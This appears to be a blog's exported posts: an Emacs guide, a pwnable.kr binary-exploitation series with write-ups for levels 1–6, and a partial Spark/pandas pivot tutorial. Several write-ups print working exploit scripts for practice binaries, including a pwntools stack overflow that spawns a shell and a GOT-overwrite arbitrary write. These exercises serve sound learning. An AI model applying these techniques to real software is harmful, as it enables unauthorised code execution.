to install lots of packages and do lots of configuration to make it fully functional for your day to day work, like code lint, debugging, auto-completion etc. It can be very tedious to learn all the configuration installing packages and survive the frustrating of the overwhelming shortcuts. My advice will be to use some start packs like prelude, spacemacs, etc to get started. These packages are Emacs configuration which has lots of development environment ready to use, they have very well document guides. You can get up and running in just a couple of hours. I had used prelude. Daily WorkflowNow that you’re little convinced to give a shot at Emacs and a bit scared to try it. So let me give you a good starter syllabus that you should master in next 6 months, some of the functions may sound really stupid but I have tried to included ever keystroke which I use in my daily workflow. I have used prelude starter pack which minimized my configuration efforts. I have described my functional expectation from a moderns text editor, fortunately, most of it is provided by prelude, if the functionality is not provided by prelude then I have mentioned the link to the blog post which will help you to set it up. File management - this is the most basic thing you will do with any editor so get comfortable with opening, saving and creating new files. Email management - emails are the very important form of communication in any organization, so it would be convenient to get it done in your editor and it would be great to not to leaving the editor for such trivial matters, this is the link to a nice post on how to setup email in Emacs. Another good thing about it is you will have your entire email account offline which is available to you all the time and you can make complex filter and search. Project management: if you are working on a project then you are most likely dealing with a couple of hundred files and classes. There is an awesome project management plugin called projectile, below I have listed few of the functionality it provides : switch between different projects compile a project and running test cases exploring code files and directory structure Version control git - although git functionality is not provided by projectile, there is a great plugin called magit, besides providing all the basic functionality of git it does also provide many of advanced functionality which git is capable of. I highly recommend you to check magit official website https://magit.vc/ to get the details of the tool. auto-completion - this functionality can help you to minimize the number of keystrokes to accomplish something, could be spelling, variable name completion, etc, there are two competing frameworks in this space, Helm and Ivy here is the link to the post which describes the pros and cons of both the tool. IDE - code intelligence framework which is what advance editor like Eclipse and IntelliJ provides. You can configure Emacs as well to get those functionalities for many of the major languages like python, javascript, etc most of these configurations are already present in prelude, you can check prelude Github page, some of the environment are commented you just have to uncomment it to use it. Below are some those functionalities that are provided auto indenting/reformatting the file/section. code lint inbuilt function library documentation navigating the code source Shell tools - by shell tools I mean all the types of the shell-like bash shell, ipython shell scala (using ensime scala plugin). Multiline Edits - this the cool feature provided by sublime and atom which I absolutely can’t live without, fortunately, there is a multi-cursor package which you can install, this link to the Github project has __MultiGood instruction on how to set it up. swapping line, moving line/lines of code up and down, moving a block of code up and down Useful Emacs packages flycheck: spelling correction and suggestions. ido-mode: buffer switch made easy. When you switch buffer all the name of the buffer are made available and the command shell instead of opening up the list of buffer and then selecting it from there. helm - autocomplete framework to auto complete anything and everything it has tons of feature ivy - helm alternative which is very fast and minimulist, you probably won’t use every feature helm provides so ivy is light weight and minimul memory footprint alternative. A nice blog post comparing both helm and ivy link neotree - give you project exploration on the side view, like Atom and sublime editor. org-mode - organize your life, note taking, blogging, writing document, this link gives full capability of org-mode in short, here is the full(long) version of the book. yasnippet - template system, you can define your own code template which can expand on few keystrokes, fortunately, it also has another repository which there are collection of snippets for popular programming language which are ready to use you can check the repository at this link Good resource Motivational Video: in this video, the guy gives a deep justification as to what an editor should be and why should one invest time and effort to learn about editor and shares his experience about Emacs as well. emacsrocks.com good tricks and tips about Emacs Emacs for writer by writer(non-programmer) talk link Emacs ocean of knowledge none other than emacswiki.org Manage your Finances and Ledger with Emacs link Nice introduction video on org-mode link How to use Org-capture link ConclusionHopefully, I have convinced you to inspire you to start using Emacs as you secondary editor and soon as your primary. I will keep updating this post as I get new insights or obstacle as the beginner. Emacs is a big ocean no dough about, you have to swim through it sure there are pearls and diamonds in it but there are sharks and there won’t be dolphins in every tide to help you, what I am trying to tell is it you don’t have to make Emacs as your it an ultimate fighting machine, but just enough to get your work done and evolve it over time slow and steady. I am telling you this because you might start over work on the configuration and get drown in it, just a word of caution. Happy Emacsing.","link":"/2018/04/12/lets-emacs-in-21st-century/"},{"title":"Linux Binary Exploitation Series (with pwnable.kr)","text":"There’s no use talking about the problem unless you talk about the solution. Betty Williams This is a kick-off post for the series of post on The War Game pwnable.kr. It’s focused on Linux Exploitation. To get gpdates about this blog series you can subscribe here Recently a friend of mine suggested me a WarGame site called pwnable.kr, which is a series of Linux exploitation CTF style challenges. Since a long time I wanted to polish my exploitation skills but I was distracted by different projects, but once I and visiting the website it looked interesting and working on these challenges would be a clear goal, so I said why not, let’s do it. Well obviously I did look for reviews on the internet for this War Game and they were pretty positive and lots of people have already posted the solution so this motivated me further to solve these challenges. Since there are lots of solutions out there I will not refer to any of them and try to solve these challenges myself and in case I decide to refer to those solutions then, in all honesty, I will mention it. Once I have managed to solve these challenges, I will then compare my solution to other public solution and see if I could have taken a better approach. MotivationWhat caught my attention about this website was the Artwork, I loved it, and other major reason being these are challenges of various difficulty which goes as Toddler’s Bottle(Easy), Rookiss(Medium), Grotesque(Hard), Hacker’s Secret(1337). The author of the game suggests that you can post the solutions for Easy(Toddler’s Bottle’s) challenges but not for other levels, at best you can post some suggestion. To respect it, that’s what I will do, solutions and suggestion. So fine artwork which you will see on the website Know the BasicsIts always good to know where you are and where you want to reach. You need to have some basic knowledge to make your way a little easy through these ways Basic knowledge of how stack-overflow works and what a memory corruption is in general. A basic understanding of ELF file format and what information can it give about the program, since we are exploiting on Linux system knowing about it will take you a long way. ELF is to Linux, what exe is to Windows, an executable program. Good understanding of what Process and Threads are, and how they work. Basics of writing and compiling x86/86_64 assembly code. A basic understanding of process memory like Heap, Stack works, how is it allocated/freed etc, But, don’t get intimidated by all above-mentioned points, if you don’t know all those stuff don’t worry, as we progress during the series I will point out basic concepts you need to know to solve a particular challenge and what will you learn by solving these challenges. I will try to explain those concepts if not will point you out to appropriate sources to catch-up. Tools for the TradeTooling is a very important part of any trade-craft so here are some of the tools we are going to use during the series: Ghidra - is a disassembly/decompilation tool primarily used for static reverse engineering. This is my replacement for IDA-Pro. Radare2 - is a suite of tool for reverse engineering, this project bundles(rax2, rabin2, rasm2, etc). This project is simply amazing, it is emacs for reversing. We will use it for both dynamic/static analysis, shellcode, patching and many binary related chores for which otherwise you would have got to write a script. gdb - for dynamic debugging, it’s a de-facto tool for debugging on Linux platform. But vanilla gdb is very painful so I will use it along with gef gdb plugin which is written in python which the experience of using gdb amazing. The Github page of the project will tell you how to setup the tool and the documentation is also very good. Python 3 - any scripting language is fine, I am choosing this as I am comfortable with python and there are lots of tools already written in python which will save our time and help us focus on exploitation. pwntools - This library is CTF framework and exploit development library written in python. It is going be a very important tool in our arsenal for writing exploit script and other automation need to complete the challenge(like ssh, socket, etc). The package is very stable and very beautifully written with very good documentation and also installation is pretty easy. If you don’t know anything about this library don’t worry, neither did I when I started solving these challenges. If you want to follow the progress of this series you can flow the tag pwnable-kr on this website. Solution PostToddler’s Bottle Post not found: binary-exploitation-pwnable-kr-level-1 fd Post not found: binary-exploitation-pwnable-kr-level-2 collision Post not found: binary-exploitation-pwnable-kr-level-3 bof Post not found: binary-exploitation-pwnable-kr-level-4 flag Post not found: binary-exploitation-pwnable-kr-level-5 passcode Post not found: binary-exploitation-pwnable-kr-level-6 random input leg mistake shellshock coin1 blackjack lotto cmd1 cmd2 uaf memcpy asm unlink blukat horcruxes To get gpdates about this blog series you can subscribe here Happy Hacking","link":"/2020/04/28/linux-binary-exploitation-series-with-pwnable-kr/"},{"title":"Binary Exploitation [pwnable.kr] - (Level 1) FD","text":"Challange Description Name FD Points 7 Solves 12586 times Category Exploitation Description Mommy! what is a file descriptor in Linux? Once you connect to the remote server you will see fd binary and fd.c file in the current directory. 12345678910111213141516171819// fd.cchar buf[32];int main(int argc, char* argv[], char* envp[]){ if(argc&lt;2){ printf(&quot;pass argv[1] a number\\n&quot;); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(&quot;LETMEWIN\\n&quot;, buf)){ printf(&quot;good job :)\\n&quot;); system(&quot;/bin/cat flag&quot;); exit(0); } printf(&quot;learn about Linux file IO\\n&quot;); return 0;} HintTry to run the file with various parameters and observer the results, reading the code it is clear that it takesone command-line parameter which is then conversed into integer and subtracted with a strangenumber. Why is it so? the result of subtraction is then used as an fd parameter to read datainto the buffer and the buffer is compared with a string and if the string matches we havethe flag. Sweet! But wait, from where is the read function reading the data from? From what I know read functionsthe first parameter is a file descriptor, and file description is the value you get when you open afile. In the code no file is opened, however, the file descriptor is calculated indirectly(by subtractingfrom cmd-line value 0x1234) and used as fd parameter to read, what going on? File Descriptor (fd) is a unique identifier return by Linux Kernel when you make an open system call.This identifier is used later to do other operations like read, write, seek, etc. You must a have heardUnix philosophy that Everything is a file in *nix. That’s right everything is a file, you open anetwork socket you get a fd in return, you can do read/write on that. Then later the fd can be used to release the resource by doing a close system call or they are close by the kernel when the process dies/killed. SolutionOk good, but what’s the mystery of read call without open? we don’t have any fd opened! right? Wrong, but when kernel launches a new process by default it attached three file descriptor by default with every process, which is are stdin(fd=0), stdout=(fd=1) and strerr(fd=2). So any process will have atleast three open file descriptor, and this number increases in sequence for each open request. So, there you have it, if you provide the value of fd=0 for read call you will halt for input from cmd terminal. The input number should be such that subtraction(by 0x1234) results in zero. Now all you have to do is type those sweet letters in proper order. ConclusionAll thought it was a very simple challenge but its good for people getting started with CTF’s and Linux exploitation.","link":"/2020/05/07/binary-exploitation-pwnable-kr-level-1/"},{"title":"Binary Exploitation [pwnable.kr] - (Level 2) Collision","text":"Challenge Description Name BOF Points 7 Solves 12586 times Category Exploitation Description Daddy told me about cool MD5 hash collision today. I wanna do something like that too! Below is the source code of the challange which you will see on the server. 1234567891011121314151617181920212223242526272829unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++){ res += ip[i]; } return res;}int main(int argc, char* argv[]){ if(argc&lt;2){ printf(&quot;usage : %s [passcode]\\n&quot;, argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(&quot;passcode length should be 20 bytes\\n&quot;); return 0; } if(hashcode == check_password( argv[1] )){ system(&quot;/bin/cat flag&quot;); return 0; } else printf(&quot;wrong passcode.\\n&quot;); return 0;} What are Hashes?and why is there a collision between them, you might ask! Hash are core elements of the modern digital signature. Input to a hash function is data forwhich you want to create a signature for, and output is a unique fixed-sized signature.This conversion of input data to signature is done by a special algorithm like MD5, SHA1,SHA256, etc. output of these algorithms is called hash value or message digest. Hash algorithm can be applied to any data/document or any size and its hash value can beconsidered as the unique identification of that document, and in future, if anyone changesthe content of data/document the resulting hash value also change. Hashes are used inblock-chains, digital certificates, etc, to validate the integrity of the document issued. Ideally, no two different sets of data/document should have the same hash value, that will result in the hash collision which is bad because then we can generate duplicate data/document of the same hash value, which make the hash value useless for integrity check. HintThis challenge uses one such over-simplified such hash algorithm and our task is toprovide an input that will result in hash value 0x21DD09EC, we have to generatea hash collision. Hash AlgorithmThe program takes one input parameter which is the data which will be hash and itshould be of fixed size 20 bytes. The hash algorithm converts the char pointerto integer pointer which will transform 20 bytes into 5 integer data and then itdoes the addition of those values. The result of this hashing should be 0x21DD09ECto get the flag. SolutionPlan one byte at a time. One way to visualize the input would that input is 5 groups of 4 bytes.The first byte of each group will affect the first byte of the resultant hash second byte ofeach group will affect the second byte, so on and so forth. Offset 0 1 2 3 0x0 0x01 0x01 0x01 0x01 0x4 0x01 0x01 0x01 0x01 0x8 0x01 0x01 0x01 0x01 0xC 0x01 0x01 0x01 0x01 0x10 0xE8 0x05 0xD9 0x1D ======== ====== ====== ====== ====== Result 0x21 0xDD 0x09 0xEC To give a hex input you need to do command-line fu, the following command will be the solutionto the challenge. echo -e &quot;\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\xe8\\x05\\xd9\\x1d&quot; ConclusionThis challenge is to give you a peek of how hashes are created and how to manipulate themto create a collision.","link":"/2020/05/09/binary-exploitation-pwnable-kr-level-2/"},{"title":"Binary Exploitation [pwnable.kr] - (Level 3) BOF","text":"Challenge Description Name BOF Points 7 Solves 12586 times Category Exploitation Description Nana told me that buffer overflow is one of the most common software vulnerability. Is that true? This challenge is a classic buffer overflow but to interact with the program we have to connect to the remote server, and this simple challenge is a very good example of remote exploitation. If you don’t know what stack overflow is, I highly recommend you to read the classic paper. This paper also gives you an introduction on how to write an exploit. In this challenge you won’t be able to do ssh login, you are given a link from where you have to download binary, code file and to solve the challenge you have to connect to the remote socket(on pwnable.kr 9000) and interact with the program. For initial testing, you can do a simple netcat connection and interact with the program. This is the vulnerable C program. 123456789101112131415void func(int key){ char overflowme[32]; printf(&quot;overflow me : &quot;); gets(overflowme); // smash me! if(key == 0xcafebabe){ system(&quot;/bin/sh&quot;); } else{ printf(&quot;Nah..\\n&quot;); }}int main(int argc, char* argv[]){ func(0xdeadbeef); return 0;} HintThe program calls the func function with a hardcoded parameter and in that function, it takes input from the stdin into overflowme buffer which is of 32 bytes. Next, the key parameter which was passed to the func function is compared with 0xcafebabe value and if it is equal you get the shell access from which you can read the flag file. The question that naturally arises is if the program input is stored into overflowme variable and if it does not affect key param with which comparison is done as the value is hard-coded to (0xdeadbeaf), then how am I suppose to solve this? Unless if we can! If we can somehow we can change the value of key param to 0xcafebabe while giving input to overflowme variable we can get the shell. The main idea here is to do buffer overflow in overflowme variable when user input is taken by calling the gets function, the target of the overflow is to overwrite the value in key parameter with 0xcafebabe. Why are we blaming gets function for the overflow? well if you read the gets function documentation it says that function accepts the input until EOF or \\0 characters has reached. It does not check if the buffer it is filling is sufficiently large to hold the data thus allowing us to overwrite adjacent memory. SolutionTo overwrite the key param we need to calculate the precise length of input we need to give to gets function, for that, we need to understand the stack layout of the program. To understand what the layout of the stack layout lets first looks at the function disassembly As you can see in the first highlight function has allocating stack of 0x48 bytes which is much higher than our function needs, right?. While our program just has one variable (overflowme) but compiler also creates some extra space for internal variables which it needs for calling function and to store temporary results, that’s the reason we see allocated size is much higher than what we see in the C code. Let’s look at the stack layout. overflowme variable is located at 44 bytes above from the start of stack-frame. and key parameter is 8 bytes below EBP and so the key param is 44+8=52 bytes from the overflowme variable. To overwrite the key param you first need to give 52 bytes of junk value and 0xcafebabe value. One important thing to understand is EBP always points to the start of the stack-frame and ESP points to the end of stack-frame, all the local variables of the function are stored within this limit of the memory. Each function you call get their separate space for stack-frame and they do not overlap what so ever otherwise it will corrupt the process memory leading to program crash. To interact with the program we will use pwntools python package. Let’s look at the exploit script. 12345678910111213141516171819202122232425262728# import everything, its a bad practice but its simple# program lets not think too muchfrom pwn import *# remote function connects to remote socket server and it takes# host an port as the parameterrs = remote('pwnable.kr', 9000)# compose program input data# [junk (52 byte)] + [key param]sol_data = p8(0x41)*52 + p32(0xcafebabe)# sendline function the data to the remote server,# parameter is data you want to send and it should be in# byte typers.sendline(sol_data)# at this point we have a shell open on the remote server# and in the shell, we send the command to read the flag filers.sendline('cat flag')# recv function reads the raw data from the socket and return# bytes data recvS function also does the same except it converter# those bytes data into stringprint('Flag : ' , rs.recvS(timeout=1))# close the socketrs.close() Let check what all security mechanisms are present in the binary, for this task pwntools python library can help us. When you install pwntools python package, it also installs the command-line tool called pwn. Many of the library functions which you can invoke from the code are also callable from the command-line, this help in the rapid prototype of ideas. To do the security check run pwn checksec bof you will see the below output Stack protection is enabled, then how come we manage to overflow the buffer and not get into trouble? The reason is the stack canary check is done at the end of the function while the code to get the shell is executed before the function ends. ConclusionThis challenge was a simple program which does a classic buffer overflow but this was a remote version and you don’t have to write any shellcode but this class of attack is called data-only attack whereby changing the data of the program we have redirected the flow of the program. We also created our first exploit program with pwntools.","link":"/2020/05/16/binary-exploitation-pwnable-kr-level-3/"},{"title":"Binary Exploitation [pwnable.kr] - (Level 4) flag","text":"Challenge Description Name flag Points 7 Solves 10695 times Category Exploitation Description Papa brought me a packed present! let’s open it. This is reversing task. all you need is binary The challenge binary can be downloaded from this link. From the description seems like it is a reverse engineering task. Let’s download the binary and load it up in ghidra. What is a Packer?Packers are the program binary that compresses the original program and create a new program binary called packed binary, this new binary has the code to decompress the original program and run it. When you execute the packed binary it first executes the decompression code that unpacks the original program in the process memory and then transfers the control to the original program for execution. Packer program can pack and unpack the program without source code of the original program. Compression is not the only thing that packers do, they might even introduce a code that checks if the program is been debugged or if the program is executed in a virtual machine. It might even encrypt the original program and decrypt it only certain conditions are met. The general idea is there is a code that runs before the original program which controls its faith of execution. Why all this hustle? you might ask. There are many reasons why this kind of product exist in the market: A malicious program which when to evade antivirus static signature match. Since the packed program hash is different from the original program. To reduces the size of the original program so that it can store their program in a stringent environment. When someone protects their code from been reverse engineered. A malicious program which doesn’t want to run in an environment where they are monitored like a debug environment or in a virtual machine. I can go on and on about this topic, but the crux of the matter is of challenge binary is hidden behind a packer program. HintThere are many packers in the market on one of the most popular packers is UPX, it supports many platforms like Windows, Linux, etc and also support different architecture exotic architecture like x86, ARM, SPARC, PowerPC, etc. You can execute the simple command to compress/decompress the binary. To decompress the binary execute upx -d This cover the first clue. Once you execute the unpacked program you will be presented with the second clue to solve the challenge. Which is I will malloc() and strcpy the flag there. take it.. Revere engineer the unpacked binary and check the parameters of the function mentioned in the hint you will have the solution. SolutionOnce you load the binary in ghidra and go to the main function you will see below disassembly. As the hint says there is a malloc followed by strcpy, but I can’t see any strcpy? exactly that was my first thought but then there is flag variable been used on line 9. Let see what that variable has? The variable seems like a reference to a string, let’s click on the reference and see what the string value is. Looks like a flag to me. Submit the flag and you have completed the challenge. If you inspect the rest of the binary or follow thru_FUN in the above main function then you would have wasted a lot of the time reversing needlessly, that what I did initially when solving the challenge. Maybe it was a decoy for the over smarts folks. ConclusionI would say this is the most simple challenge if you follow the hints. The new tool which was introduced was a packer and we looked very briefly at it used that knowledge to unpack the challenge binary and then reverse-engineered the binary to get the flag.","link":"/2020/05/17/binary-exploitation-pwnable-kr-level-4/"},{"title":"Binary Exploitation [pwnable.kr] - (Level 5) passcode","text":"Challange Description Name random Points 10 Solves 7513 times Category Exploitation Description Mommy told me to make a passcode based login system. My initial C code was compiled without any error! Well, there was some compiler warning, but who cares about that? To get the flag you have to connect to the remote machine using SSH ssh passcode@pwnable.kr -p2222 (pw:guest) and interact with the program. This challenge is about what can you do if you have an arbitrary write vulnerability, and in this post, you will learn how you can use the vulnerability to get a shell on a system and we will look at what all point in the system we can attack to achieve that. Let’s start by looking at the code. 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login(){ int passcode1; int passcode2; printf(&quot;enter passcode1 : &quot;); scanf(&quot;%d&quot;, passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(&quot;enter passcode2 : &quot;); scanf(&quot;%d&quot;, passcode2); printf(&quot;checking...\\n&quot;); if(passcode1==338150 &amp;&amp; passcode2==13371337){ printf(&quot;Login OK!\\n&quot;); system(&quot;/bin/cat flag&quot;); } else{ printf(&quot;Login Failed!\\n&quot;); exit(0); }}void welcome(){ char name[100]; printf(&quot;enter you name : &quot;); scanf(&quot;%100s&quot;, name); printf(&quot;Welcome %s!\\n&quot;, name);}int main(){ printf(&quot;Toddler's Secure Login System 1.0 beta.\\n&quot;); welcome(); login(); // something after login... printf(&quot;Now I can safely trust you that you have credential :)\\n&quot;); return 0;} It’s a simple program which has three input via scanf function so there are three possible opportunities for program corruption. The first input takes the name and prints it and the other two input as some sort of passcodes which are compared with hard-coded values. If the value matches then the values are printed on the console. Well, look very simple, doesn’t it? you might have to do some command-line fu to send hex-value but that fine, once have solved the challenge please read the rest of the post for more insight. HintWell obviously if you are reading, the approach I suggested previously didn’t work out, it’s not that simple after all. The hint of the solution is given in the challenge description, it is something about compiler warning. If you try to compile the program with gcc you will see below warning. passcode.c:9:10: warning: format ‘%d’ expects argument of type ‘int ‘, but argument 2 has type ‘int’ [-Wformat=] scanf(“**%d“, passcode1);* passcode.c:14:10: warning: format ‘%d’ expects argument of type ‘int ‘, but argument 2 has type ‘int’ [-Wformat=] scanf(“**%d“, passcode2);* So the warning says scanf is expecting argument of type int *, aa integer pointer, but an integer is given. Why is the compiler is so irritated about it? maybe for a reason? Let’s try to understand the difference between an integer variable and an integer pointer variable. An integer variable stores an integer data, but an integer pointer variable stored the address of an integer variable instead of an integer data. The two warning show are both about same issues where scanf is expecting integer pointer but instead, an integer variable is passed, this is where the vulnerability is, when you call the scanf the input will be converted to integer (“%d”) and will be written at the address pointed by passcode1 variable, the difference is subtle but can make a huge impact on execution. The diagram below illustrates what I am trying to tell. This will give you an arbitrary write. We can target GOT table entry to overwrite any function pointer to redirect it to code dumping the flag. In the next section, we will explore more about this technique. SolutionBut the next question is how to we put the value in passcode1 such that it points to a valid location, as there is no way we can initialize the pointer value in passcode1 unless we can! If you read the code carefully, welcome function is called before login function and login has a variable called name whose content can be controlled by the user and when the welcome function returns the stack gets torn down but the content remains on the stack, later when login function is executed the stack gets reused and the passcode1 holds the first 4 bytes of the char name[100] variable. So we can control the value of passcode1 variable, whatever value we give for the first four bytes of the name variable gets assigned as a pointer value for passcode1 variable. Now that we can control the value of passcode1 variable and make it point to anywhere in the process memory and when we make the scanf function call we can write whatever value we like which effectively gives an arbitrary write of size 4 bytes. Now comes the next part, at what address do we write and what? Can’t we overwrite the return address of the login function? We can, but we won’t reach to that point during our execution, why you might ask? Let try to understand it a bit more, let say if we manage to execute the scanf and all the subsequent calls and we reach the point where password check is done if it fails we will exit the program we are not returning from the function, so overwriting return address will not affect the program execution. We need to search some other point in the program that we can overwrite such that we can execute flag dumping part of the code. The location we are looking for is GOT table. What is the Global Offset Table (GOT)?When you compile a program, the compiled binary doesn’t have all the code that it needs for execution, for example, the function like printf, scanf, fflush are not present the passcode binary, it only has the reference to those function which are loaded from other binary and those references are stored in something called as Global Offset Table aka GOT. The program binary has the necessary information to search for these referenced functions during load time and GOT table is populated with those references. The segment in which GOT resides in is writable so we won’t have memory permission issues, and if we pointer our passcode1 variable to one of the GOT table entry we can redirect the code execution. This looks great we can overwrite the function pointer of one of the functions from the GOT table and when that function is executed it will change the flow of the program to wherever location we want. But how do I know what is the GOT table and what is the function we want to overwrite. Good question, this is where pwndbg comes into the picture, it has a nice command called got that prints the GOT table. Let’s try it out, start the passcode program in gdb and put a breakpoint in the main function and run the program then issue the got command and you will see something as shown below. This command prints all the entries in GOT table along with their value. So, for example, fflush entry is on the address 0x804a004 and the value of the address is 0x8048436 which is the address of fflush function. We can choose to overwrite the fflush function as it is the function just following the scanf function. We can overwrite the address with to the if block of login function the code which prints the flag. Awesome let put together all that we have discussed so far in a script which is as follow 1234567891011121314151617181920212223from pwn import *# open a remote ssh connectionsh = ssh(host='pwnable.kr',user='passcode',port=2222,password='guest')# lunch a process on the ssh connections = sh.process('./passcode')fflush_func_addr = p32(0x804a004)d_buf = p8(0x41)*96 + fflush_func_addrprint(s.recv())log.info('Send arb write ptr')s.sendline(d_buf)log.info(s.recv())ret_addr = str(0x080485d7)# send the write payload which is cmd basic blocks.sendline(ret_addr)res_data = s.recvall()print(res_data.decode('utf-8'))s.close() Executing this script should give you the flag. ConclusionIn this challenge, we learnt the very important concept of a pointer and how we can abuse it to get an arbitrary write. We took advantage of that vulnerability to overwrite a GOT table entry to archive code execution the code we executed was to printf challenge flag which would only be printed if the passcode would have matched but instead we managed to do it even without giving correct passcode. We also leant another important Linux ELF file concept of GOT table which is often abused by exploits and malware author for different purposes but here we used it to redirect the program flow. This was a little tricky challenge but I hope you enjoyed it.","link":"/2020/06/06/binary-exploitation-pwnable-kr-level-5/"},{"title":"Binary Exploitation [pwnable.kr] - (Level 6) random","text":"Challange Description Name random Points 1 Solves 9870 times Category Exploitation Description Daddy, teach me how to use random value in programming! The challenge binary is on ssh random@pwnable.kr -p2222 (pw:guest) As you would have guessed this challenge is about exploiting the random value generation. Let look at the file random.c which you will find on the server once you log-in. 123456789101112131415161718#include &lt;stdio.h&gt;int main(){ unsigned int random; random = rand(); // random value! unsigned int key=0; scanf(&quot;%d&quot;, &amp;key); if( (key ^ random) == 0xdeadbeef ){ printf(&quot;Good!\\n&quot;); system(&quot;/bin/cat flag&quot;); return 0; } printf(&quot;Wrong, maybe you should try 2^32 cases.\\n&quot;); return 0;} HintThe program is very simple it accepts integer input and xor it with the random value generated by rand() function and compares it with 0xdeadbeef and if the value matched you have to flag printed. In the above program key ^ random = 0xdeadbeef condition can be revered and the equation is equivalent to random ^ 0xdeadbeef = key, so to solve this challenge we have to figure a way to predict the random value generated by rand() function, then we can reverse the operation by XORing the rand value with 0xdeadbeef get the input we need to get the flag. Random Number GeneratorEvery time you call the rand() function it returns a random number. This function is usually used to generate a sequence of random number. But this often gets inconvenient if you want to reproduce the same sequence, for that we set the seed-value before calling rand() function. So essentially you can reset the random sequence generator by setting the seed-value and called the rand function again it will reproduce the same sequence. You can set the seed value using srand() function. Let look at rand() function docs, it states that if we don’t set the seed value with srand() function the default seed value to 1. Aahaa.. there you go, so we can reproduce the random value. Write a sample program that prints random value on server and that will be the number you have to xor with 0xdeadbeef to get the input. SolutionHere is the sample program you need to execute on the server that simply prints the random value. 12345#include &lt;stdio.h&gt;void main() { printf(&quot;%d\\n&quot;, rand());} But there is a catch you cannot write anything on the home, but you can go to tmp directory and create a folder there and paste the above code in a new file and compile and run the program. 12345678910111213141516171819random@pwnable:/tmp$ mkdir r_trandom@pwnable:/tmp$ cd r_trandom@pwnable:/tmp/r_t$ lsrandom@pwnable:/tmp/r_t$ nano hi.cUnable to create directory /home/random/.nano: Permission deniedIt is required for saving/loading search history or cursor positions.Press Enter to continuerandom@pwnable:/tmp/r_t$ gcc hi.chi.c: In function 'main':hi.c:4:18: warning: implicit declaration of function 'rand' [-Wimplicit-function-declaration] random = rand(); ^random@pwnable:/tmp/r_t$ lsa.out hi.crandom@pwnable:/tmp/r_t$ ./a.out1804289383random@pwnable:/tmp/r_t$ ./a.out1804289383 As you can see the program above processes the same random value every time, so will you random.c program. Now you can xor this value with 0xdeadbeef to get the result, the command is a follows python -c 'print(1804289383^0xdeadbeef)' return value 3039230856 in my case. Once you give the integer to the program it will print the flag. 1234567random@pwnable:/tmp/r_t$ cd ~random@pwnable:~$ lsflag random random.crandom@pwnable:~$ ./random3039230856Good!Mommy, I thought libc random is unpredictable... ConclusionIn this challenge, we learn how to exploit the weakness in random value generator, although it may look silly but if this kind of weakness can compromise the entire cryptographic process, which is a very serious problem. Nonetheless a crafty little challenge for a beginner.","link":"/2020/06/07/binary-exploitation-pwnable-kr-level-6/"},{"title":"Reshaping Dataframe using Pivot and Melt in Apache Spark and pandas","text":"Data cleaning is one of the most important and tedious part of data science workflow often mentioned but least discussed topic. Reflecting on my daily workflow, task of reshaping DataFrame is the very common operation I often do to get the data in desired format. Reshaping dataframe means transformation of the table structure, may be remove/adding of columns/rows or doing some aggregations on certains rows and produce a new column to summerize the aggregation result. In this post I won’t cover everything about reshaping, but I will discuss two most frequently used operations i.e. pivot and melt. The solutions I discuss are in spark to be more specific pyspark and I will give you brief solution for pandas but if you want detail explanation of pandas solution I would recommend you to read this post. Pivoting operation on dataData is usually stored in stacked format or record format, which can sometimes have repeated values which means the data is not normalized. When you want to summarize the data in a tabular view, pivot can be a very use transformation. Let take an example of online business which sell music and books and sales data(over simplified) is shown table below. TABLE A product category quarter profit memories book q1 10 dreams book q2 20 reflections book q3 30 how to build a house book q4 40 wonderful life music q1 10 million miles music q2 20 run away music q3 30 mind and body music q4 40 Above table has four columns, product and category are pretty much self explanatory, columns quarter and profit columns describe the profit contributed by the each product for that quarter. Some observation that can be made about table is that it is aggregation for the each product profit for each quarter but difficult to grasp in first look. This format of the table can be seen as: stacked format : individual observation for each product is stacked on each other. record format : each row is the record for a song or a book. long format : if there are million music tables will be long and the columns are not too much. If we want to summarize the quarterly profit for each category of product in tabular format then the table below would have been more appropriate. TABLE B category q1 q2 q3 q4 music 10 20 30 40 book 10 20 30 40 The table above is much more intuitive compared to TABLE A. This is what pivot operation will help us to achieve. Pivot will take unique value of a specific column/columns and turn it into one or more columns with the unique values of that column as the name of the columns, in our example q1-q4 were the unique value of the column quarter so a new columns is created for each quarter has column, this newly added columns are called pivot columns. Spark provides pivot functions in DataFrame object to for pivot transformation. Pivot functions requires four parameters the on which as as follows: Pivot column is the column who’s unique values will become pivot columns. In case of our example category column is the pivot. Value column is the column whos value will be aggregated and mapped to index column, profit columns is what we are aggregating for this example so its value column. Index column is the column which you want to use it as a index for the pivot columns. For this example category is the index column. Aggregation function in case if there are more the one row for a the column we are pivoting on. We have used sum function for this example, if there are more then one row for books category for q4 then we will sum profit for q4, but can change the aggregating function depending on question you are trying to answer. One could use average function to find average cost of book sold in each quarter. Pivot in SparkLets try some code example, below is the pyspark implementation of pivot transformation: 1234567891011121314151617181920212223242526from pyspark.sql import SQLContextsqlContext = SQLContext(sc)# create RDD for productsdata = sc.parallelize([ ['memories','book','q1',10], ['dreams','book','q2',20], ['reflections','book','q3',30], ['how to build a house','book','q4',40], ['wonderful life','music','q1',10], ['million miles','music','q2',20], ['run away','music','q3',30], ['mind and body','music','q4',40],])# convert the RDD to DataFramedf_products = sqlContext.createDataFrame(data, ['product','category','quarter','profit'])# index column : category# value column : profit# pivot column : quarter# agg function : sum## apply pivot on DataFrame DataFramedf_products.groupBy('category').pivot('quarter').sum('profit').show() We first create a RDD of the product then, create a DataFrame from that RDD. In the next step pivot transformation is applied. As you might have noticed that you don’t exclusively pass parameters to pivot function, pivot function only take the name of the pivot column. The result of the above code snippet is the TABLE B. Pivot in PandasPivot method is also available in pandas library which take the same four parameters we described above, difference is in pandas just one method call will be provided with all the four parameters. The code below first converts the Spark’s Dataframe to pandas DataFrame and then apply pivot__table function on the DataFrame, resulting DataFrame will look like TABLE B 12345678# convert from spark DataFrame to pandas DataFramedf_products_pd = df_products.toPandas()# apply pivot on pandas DataFramedf_products_pd.pivot_table(index='category' ,columns='quarter' ,values='profit' ,aggfunc=sum) Common Mistakes in Pivot operationOne of the common mistake people make while using pivot transformation is that they try to apply it on column with numeric values, while 